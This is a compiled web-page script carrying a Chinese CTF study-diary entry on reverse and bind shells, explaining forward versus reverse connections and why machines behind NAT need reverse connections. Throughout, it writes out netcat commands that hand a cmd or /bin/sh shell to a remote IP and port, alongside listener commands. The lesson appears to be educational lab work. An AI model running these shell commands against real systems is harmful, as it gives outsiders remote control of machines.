(window.webpackJsonp=window.webpackJsonp||[]).push([[188],{725:function(s,a,e){"use strict";e.r(a);var n=e(2),t=Object(n.a)({},(function(){var s=this,a=s._self._c;return a("ContentSlotsDistributor",{attrs:{"slot-key":s.$parent.slotKey}},[a("Boxx"),s._v(" "),a("p",[s._v("从0开始学习CTF，了解CTF基本规则、方法，这是开始打卡学习的第52天")]),s._v(" "),a("p",[s._v("今日内容：基础入门-反弹SHELL&带外查询&正反向连接&防火墙出入站&文件下载")]),s._v(" "),a("p"),a("div",{staticClass:"table-of-contents"},[a("ul",[a("li",[a("a",{attrs:{href:"#反弹shell"}},[s._v("反弹Shell")]),a("ul",[a("li",[a("a",{attrs:{href:"#反向连接演示"}},[s._v("反向连接演示")])]),a("li",[a("a",{attrs:{href:"#总结"}},[s._v("总结")])]),a("li",[a("a",{attrs:{href:"#反弹shell在内网环境的应用"}},[s._v("反弹Shell在内网环境的应用")])]),a("li",[a("a",{attrs:{href:"#反弹shell在内网环境的演示实验"}},[s._v("反弹Shell在内网环境的演示实验")])])])])])]),a("p"),s._v(" "),a("ul",[a("li",[s._v("小迪安全视频地址【"),a("RouterLink",{attrs:{to:"/views/numerology/[https://www.bilibili.com/video/BV123yAYMEwb/"}},[s._v("🔗传送门")]),s._v("】")],1)]),s._v(" "),a("h1",{attrs:{id:"第24章-基础入门-反弹shell-带外查询-正反向连接-防火墙出入站-文件下载"}},[a("a",{staticClass:"header-anchor",attrs:{href:"#第24章-基础入门-反弹shell-带外查询-正反向连接-防火墙出入站-文件下载"}},[s._v("#")]),s._v(" 第24章：基础入门-反弹SHELL&带外查询&正反向连接&防火墙出入站&文件下载")]),s._v(" "),a("h2",{attrs:{id:"反弹shell"}},[a("a",{staticClass:"header-anchor",attrs:{href:"#反弹shell"}},[s._v("#")]),s._v(" 反弹Shell")]),s._v(" "),a("h3",{attrs:{id:"反向连接演示"}},[a("a",{staticClass:"header-anchor",attrs:{href:"#反向连接演示"}},[s._v("#")]),s._v(" 反向连接演示")]),s._v(" "),a("p",[a("strong",[s._v("反向连接原理：")])]),s._v(" "),a("ul",[a("li",[s._v("主动给出去，对方监听，区别于正向连接的"),a("code",[s._v("本地监听，等待对方来连")])]),s._v(" "),a("li",[s._v("反向连接是谁监听，就控制对方")])]),s._v(" "),a("p",[a("strong",[s._v("Linux控制Windows：")])]),s._v(" "),a("ol",[a("li",[a("p",[s._v("Windows主动把CMD的权限交给某个IP和端口")]),s._v(" "),a("div",{staticClass:"language-shell line-numbers-mode"},[a("pre",{pre:!0,attrs:{class:"language-shell"}},[a("code",[a("span",{pre:!0,attrs:{class:"token function"}},[s._v("nc")]),s._v(" "),a("span",{pre:!0,attrs:{class:"token parameter variable"}},[s._v("-e")]),s._v(" cmd "),a("span",{pre:!0,attrs:{class:"token number"}},[s._v("47.94")]),s._v(".236.117 "),a("span",{pre:!0,attrs:{class:"token number"}},[s._v("5566")]),s._v("\n")])]),s._v(" "),a("div",{staticClass:"line-numbers-wrapper"},[a("span",{staticClass:"line-number"},[s._v("1")]),a("br")])])]),s._v(" "),a("li",[a("p",[s._v("Linux上监听自己的5566端口，等待上钩的鱼，而Windows是主动把钩给Linux")]),s._v(" "),a("div",{staticClass:"language-shell line-numbers-mode"},[a("pre",{pre:!0,attrs:{class:"language-shell"}},[a("code",[s._v("ncat "),a("span",{pre:!0,attrs:{class:"token parameter variable"}},[s._v("-lvp")]),s._v(" "),a("span",{pre:!0,attrs:{class:"token number"}},[s._v("5566")]),s._v("\n")])]),s._v(" "),a("div",{staticClass:"line-numbers-wrapper"},[a("span",{staticClass:"line-number"},[s._v("1")]),a("br")])])])]),s._v(" "),a("p",[a("strong",[s._v("Windows控制Linux：")])]),s._v(" "),a("ol",[a("li",[a("p",[s._v("在Windows上监听5566")]),s._v(" "),a("div",{staticClass:"language-shell line-numbers-mode"},[a("pre",{pre:!0,attrs:{class:"language-shell"}},[a("code",[a("span",{pre:!0,attrs:{class:"token function"}},[s._v("nc")]),s._v(" "),a("span",{pre:!0,attrs:{class:"token parameter variable"}},[s._v("-lvp")]),s._v(" "),a("span",{pre:!0,attrs:{class:"token number"}},[s._v("5566")]),s._v("\n")])]),s._v(" "),a("div",{staticClass:"line-numbers-wrapper"},[a("span",{staticClass:"line-number"},[s._v("1")]),a("br")])])]),s._v(" "),a("li",[a("p",[s._v("绑定自己的sh，主动给到对方的5566端口（这里"),a("code",[s._v("47.122.23.131 5566")]),s._v("指的是windows的IP和端口）")]),s._v(" "),a("div",{staticClass:"language-shell line-numbers-mode"},[a("pre",{pre:!0,attrs:{class:"language-shell"}},[a("code",[s._v("ncat "),a("span",{pre:!0,attrs:{class:"token parameter variable"}},[s._v("-e")]),s._v(" /bin/sh "),a("span",{pre:!0,attrs:{class:"token number"}},[s._v("47.122")]),s._v(".23.131 "),a("span",{pre:!0,attrs:{class:"token number"}},[s._v("5566")]),s._v("\n")])]),s._v(" "),a("div",{staticClass:"line-numbers-wrapper"},[a("span",{staticClass:"line-number"},[s._v("1")]),a("br")])])]),s._v(" "),a("li",[a("p",[s._v("实际上这就是Linux主动把权限给到Windows远程上的5566端口，区别于正向连接的Windows主动控制Linux")])])]),s._v(" "),a("h3",{attrs:{id:"总结"}},[a("a",{staticClass:"header-anchor",attrs:{href:"#总结"}},[s._v("#")]),s._v(" 总结")]),s._v(" "),a("p",[s._v("这其实是一个正反向的问题，还是刚才的图")]),s._v(" "),a("ul",[a("li",[s._v("Linux控制Windows有两种选择，一种是正向连接，一种是反向连接。\n"),a("ol",[a("li",[s._v("正向连接是Linux主动找到Windows，在Windows本地进行监听，Linux连接Windows的本地端口来实现")]),s._v(" "),a("li",[s._v("反向连接是由Windows主动把权限给到Linux，在Linux做本地监听来实现")])])]),s._v(" "),a("li",[s._v("Windows控制Linux也有两种选择，一种是正向连接，一种是反向连接\n"),a("ol",[a("li",[s._v("正向连接是Windows主动找到Linux，在Linux本地进行监听，Windows连接Linux的本地端口来实现")]),s._v(" "),a("li",[s._v("反向连接是由Linux主动把权限给到Windows，在Windows做本地监听来实现")])])])]),s._v(" "),a("h3",{attrs:{id:"反弹shell在内网环境的应用"}},[a("a",{staticClass:"header-anchor",attrs:{href:"#反弹shell在内网环境的应用"}},[s._v("#")]),s._v(" 反弹Shell在内网环境的应用")]),s._v(" "),a("p",[s._v("**了解内网：**类似公司、学校、网吧都是内网环境，他们的组网方式是通过公网IP来上网的。当用户在运营商处办理宽带业务后，运营商通常会提供一个上网账号，用户需将此账号配置到路由器上相应位置，随后，连接至该路由器的各个终端设备，便可依托此账号接入互联网，实现上网功能。")]),s._v(" "),a("p",[s._v("**思考：**如果要控制内部环境的某一台机器，会出现什么问题呢？")]),s._v(" "),a("p",[s._v("这就涉及到外网IP的单个唯一性，就只有一个主网IP，这个IP地址是全球唯一的。")]),s._v(" "),a("p",[a("img",{attrs:{src:"/img/ctfLearn/image-20250110213622805.png",alt:"image-20250110213622805"}})]),s._v(" "),a("p",[s._v("这种情况下只能用反向连接，因为我们自己服务器IP是全球唯一的，但我们正向连接的话，只能找到路由器这一层，找不到下方的哪台机器。内网IP是路由器下自己分配的。")]),s._v(" "),a("p",[s._v("**通俗理解：**就像是在学校，最多只能找到宿舍门牌号，如果说给个名字，那没有用，可能有重名的。")]),s._v(" "),a("p",[s._v("**特殊情况：**如果我们要让路由器知道是我们找的哪台机器，这就需要在路由器设置端口转发/端口映射。")]),s._v(" "),a("h3",{attrs:{id:"反弹shell在内网环境的演示实验"}},[a("a",{staticClass:"header-anchor",attrs:{href:"#反弹shell在内网环境的演示实验"}},[s._v("#")]),s._v(" 反弹Shell在内网环境的演示实验")]),s._v(" "),a("p",[s._v("视频中演示的是用Linux控制Windows虚拟机，Liunx是用SSH远程连接的，虚拟机是在本地Vmware中运行的，IP是和本机的IP是相同的。")]),s._v(" "),a("ul",[a("li",[a("p",[s._v("首先测试的是正向连接，Linux主动控制Windows，我们进入到Linux中，输入命令：")]),s._v(" "),a("div",{staticClass:"language-shell line-numbers-mode"},[a("pre",{pre:!0,attrs:{class:"language-shell"}},[a("code",[s._v("ncat "),a("span",{pre:!0,attrs:{class:"token number"}},[s._v("192.168")]),s._v(".124.128 "),a("span",{pre:!0,attrs:{class:"token number"}},[s._v("5566")]),s._v("\n")])]),s._v(" "),a("div",{staticClass:"line-numbers-wrapper"},[a("span",{staticClass:"line-number"},[s._v("1")]),a("br")])])]),s._v(" "),a("li",[a("p",[s._v("然后到虚拟机上，主动把CMD的权限绑定到端口")]),s._v(" "),a("div",{staticClass:"language-shell line-numbers-mode"},[a("pre",{pre:!0,attrs:{class:"language-shell"}},[a("code",[s._v("nc.exe "),a("span",{pre:!0,attrs:{class:"token parameter variable"}},[s._v("-e")]),s._v(" cmd lvvp "),a("span",{pre:!0,attrs:{class:"token number"}},[s._v("5566")]),s._v("\n")])]),s._v(" "),a("div",{staticClass:"line-numbers-wrapper"},[a("span",{staticClass:"line-number"},[s._v("1")]),a("br")])])]),s._v(" "),a("li",[a("p",[s._v("以上步骤完成后，发现两边都没有反应，长时间以后提示超时，其实这个结果是可以预料到的，用内网IP是肯定行不通的")])]),s._v(" "),a("li",[a("p",[s._v("下一步我们让Linux连接我们本机的IP地址，同时也是虚拟机的IP地址，此时我们Windows虚拟机上的nc还没关。")]),s._v(" "),a("div",{staticClass:"language-shell line-numbers-mode"},[a("pre",{pre:!0,attrs:{class:"language-shell"}},[a("code",[s._v("ncat "),a("span",{pre:!0,attrs:{class:"token number"}},[s._v("1.30")]),s._v(".217.180 "),a("span",{pre:!0,attrs:{class:"token number"}},[s._v("5566")]),s._v("\n")])]),s._v(" "),a("div",{staticClass:"line-numbers-wrapper"},[a("span",{staticClass:"line-number"},[s._v("1")]),a("br")])])]),s._v(" "),a("li",[a("p",[s._v("然后我们就发现，依然连接不上。原因是这个IP地址相当于路由器的出口，而路由器的出口并没有执行监听操作，所以会连接失败。")])]),s._v(" "),a("li",[a("p",[s._v("以上结果表明，我们要想要用Linux控制虚拟机中的Windows，只能通过反向连接，因为我们知道Linux的IP地址，所以让Windows主动将权限给到Linux的5566")]),s._v(" "),a("div",{staticClass:"language-shell line-numbers-mode"},[a("pre",{pre:!0,attrs:{class:"language-shell"}},[a("code",[a("span",{pre:!0,attrs:{class:"token function"}},[s._v("nc")]),s._v(" "),a("span",{pre:!0,attrs:{class:"token parameter variable"}},[s._v("-e")]),s._v(" cmd "),a("span",{pre:!0,attrs:{class:"token number"}},[s._v("123.123")]),s._v(".123.123 "),a("span",{pre:!0,attrs:{class:"token number"}},[s._v("5566")]),s._v("\n")])]),s._v(" "),a("div",{staticClass:"line-numbers-wrapper"},[a("span",{staticClass:"line-number"},[s._v("1")]),a("br")])])]),s._v(" "),a("li",[a("p",[s._v("下一步是在Linux上去监听5566端口，就能用Linux控制Windows虚拟机，实现反向连接了。")]),s._v(" "),a("div",{staticClass:"language-shell line-numbers-mode"},[a("pre",{pre:!0,attrs:{class:"language-shell"}},[a("code",[a("span",{pre:!0,attrs:{class:"token function"}},[s._v("nc")]),s._v(" "),a("span",{pre:!0,attrs:{class:"token parameter variable"}},[s._v("-lvp")]),s._v(" "),a("span",{pre:!0,attrs:{class:"token number"}},[s._v("5566")]),s._v("\n")])]),s._v(" "),a("div",{staticClass:"line-numbers-wrapper"},[a("span",{staticClass:"line-number"},[s._v("1")]),a("br")])])])]),s._v(" "),a("p",[s._v("**结论：**这就是正反向连接的应用价值，需要判断什么时候用正向连接，什么时候用反向连接。")]),s._v(" "),a("p",[s._v("**通俗理解：**他找不到你，你就去找他。")]),s._v(" "),a("p",[s._v("**反向示例：**用Windows虚拟机控制Linux")]),s._v(" "),a("ul",[a("li",[a("p",[s._v("让Linux主动把权限绑定到端口5566，然后让Windows主动连接。")]),s._v(" "),a("div",{staticClass:"language-shell line-numbers-mode"},[a("pre",{pre:!0,attrs:{class:"language-shell"}},[a("code",[a("span",{pre:!0,attrs:{class:"token comment"}},[s._v("# linux上输入以下命令")]),s._v("\nncat "),a("span",{pre:!0,attrs:{class:"token parameter variable"}},[s._v("-e")]),s._v(" /bin/sh "),a("span",{pre:!0,attrs:{class:"token parameter variable"}},[s._v("-lvp")]),s._v(" "),a("span",{pre:!0,attrs:{class:"token number"}},[s._v("5566")]),s._v("\n"),a("span",{pre:!0,attrs:{class:"token comment"}},[s._v("# windows上输入以下命令")]),s._v("\n"),a("span",{pre:!0,attrs:{class:"token function"}},[s._v("nc")]),s._v(" "),a("span",{pre:!0,attrs:{class:"token number"}},[s._v("123.123")]),s._v(".123.123 "),a("span",{pre:!0,attrs:{class:"token number"}},[s._v("5566")]),s._v("\n")])]),s._v(" "),a("div",{staticClass:"line-numbers-wrapper"},[a("span",{staticClass:"line-number"},[s._v("1")]),a("br"),a("span",{staticClass:"line-number"},[s._v("2")]),a("br"),a("span",{staticClass:"line-number"},[s._v("3")]),a("br"),a("span",{staticClass:"line-number"},[s._v("4")]),a("br")])])]),s._v(" "),a("li",[a("p",[s._v("这种从Windows来看，就成了正向连接。如果我们用反向连接，也就是Linux主动把权限给到Windows，这样是行不通的，因为我们找不到这台Windows虚拟机，因为它在内网，所以只能Windows主动发起正向连接。")])])]),s._v(" "),a("p",[s._v("**挖坑：**如果两边都是内网怎么办？这就涉及到后续的课程了。大致思路是加个中间人就可以了，两边都给到中间人做中转，让中间人作下发。")]),s._v(" "),a("blockquote",[a("p",[s._v("这里讲到的正向连接、反向连接，感觉和我以前做网站开发时，只能本地看本地网站，如果说互联网要看我虚拟机里某个搭建的网站是不可以的，这需要做端口映射，如果不做的话是访问不了的。")])])],1)}),[],!1,null,null,null);a.default=t.exports}}]);